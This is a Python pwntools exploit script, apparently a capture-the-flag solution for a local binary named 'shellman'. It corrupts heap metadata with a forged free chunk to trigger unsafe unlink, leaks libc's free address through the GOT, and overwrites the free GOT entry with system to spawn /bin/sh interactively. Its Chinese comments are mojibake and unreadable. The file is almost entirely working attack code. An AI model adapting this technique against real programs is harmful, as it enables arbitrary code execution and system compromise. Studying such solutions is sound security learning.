# coding:utf-8
from pwn import *

p = process('./shellman')
#p = remote('127.0.0.1', 12345)

def list_sh():
    p.recvuntil('>')
    p.sendline('1')
    p.recvuntil('SHELLC0DE 0: ')
    recv_addr = p.read(8 * 2) #����ע��Զ�ȡ�ĵ�ַ�����ʵ���ת��
    ret_addr = ''
    for i in range(8):
        ret_addr += recv_addr[2*i+1] + recv_addr[2*i]
    print type(recv_addr), len(recv_addr), recv_addr
    print type(ret_addr), len(ret_addr), ret_addr
    return int(ret_addr[::-1], 16)

def new_sh(sh_str):
    p.recvuntil('>')
    p.sendline('2')
    p.recvuntil(':')
    p.sendline(str(len(sh_str)))
    p.recvuntil(':')
    p.send(sh_str)
    p.recvuntil('Successfully created a new shellcode.')
    

def edit_sh(number, sh_str):
    p.recvuntil('>')
    p.sendline('3')
    p.recvuntil(':')
    p.sendline(str(number))
    p.recvuntil(':')
    p.sendline(str(len(sh_str)))
    p.recvuntil(':')
    p.send(sh_str)

def del_sh(number):
    p.recvuntil('>')
    p.sendline('4')
    p.recvuntil(':')
    p.sendline(str(number))

def main():
    # ��������chunk
    first_size = 0xa0
    second_size = 0xa0
    new_sh('A'*first_size)
    new_sh('B'*second_size)
    new_sh('/bin/sh;')
    # �����һ��������Ϣ
    PREV_IN_USE = 0x1
    prev_size_0 =   p64(0)
    size_0      =   p64(first_size | PREV_IN_USE)
    fd_0        =   p64(0x6016d0 - 0x18)
    bk_0        =   p64(0x6016d0 - 0x10)            # 0x6016c0���Դ�bss���ҵ� ����flag �� length��ƫ�ƾ��ǵ�һ��name_ptr��
    data_0      =   'p'*(first_size-0x20)           # ȥ��header �����ǹ���chunk0Ϊfree chunk ��������fd��bk
    prev_size_1 =   p64(first_size)
    size_1      =   p64(second_size + 0x10)         # 0x10Ϊheader��С ��Ϊ����free chunk ����û��fd��bk
    payload1 = prev_size_0 + size_0 + fd_0 + bk_0 + data_0  #first fake free chunk
    payload1 += prev_size_1 + size_1                        #second chunk header
    edit_sh(0, payload1)            # ����chunk
    # ����unlink
    del_sh(1);
    free_got_addr = 0x0000000000601600
    # *0x6016d0 = 0x6016d0 - 0x18 ��shell_0��name_ptr�Ѿ������shell_0���׵�ַ
    rubbish = p64(0x0)                              # ����ӳ��� 0x6010b8 ���޹ؽ�Ҫ��
    is_shellcode_exist = p64(0x1)                   # flag
    shellcode_size = p64(0xa)                       # Ҫ��ӡ���ַ������� 10*%02x
    libc_free_got = p64(free_got_addr)              # got����free�ĵ�ַ
    payload2 = rubbish + is_shellcode_exist + shellcode_size + libc_free_got
    # leak
    edit_sh(0, payload2)
    free_address = list_sh()
    print "free_address:", hex(free_address)
    # ����system��ַ
    lib_sys_addr =  0x0000000000046590      # ����ڱ�������, ��ldd�鿴�³���װ�ص�so��, Ȼ�󵽸ÿ���objdump -T ���Ҷ�Ӧ�����ͺ���
    lib_free_addr = 0x0000000000082d00
    #lib_sys_addr =  0x46640                # ���������ṩ��so���ҵ���
    #lib_free_addr = 0x82df0
    system_addr = free_address - lib_free_addr + lib_sys_addr
    print "system_addr:", hex(system_addr)
    # �޸�got����free��ַΪsystem
    edit_sh(0, p64(system_addr))
    # ����free(ʵ�����Ѿ��޸ĳ���system)
    del_sh(2)
    p.interactive()

main()

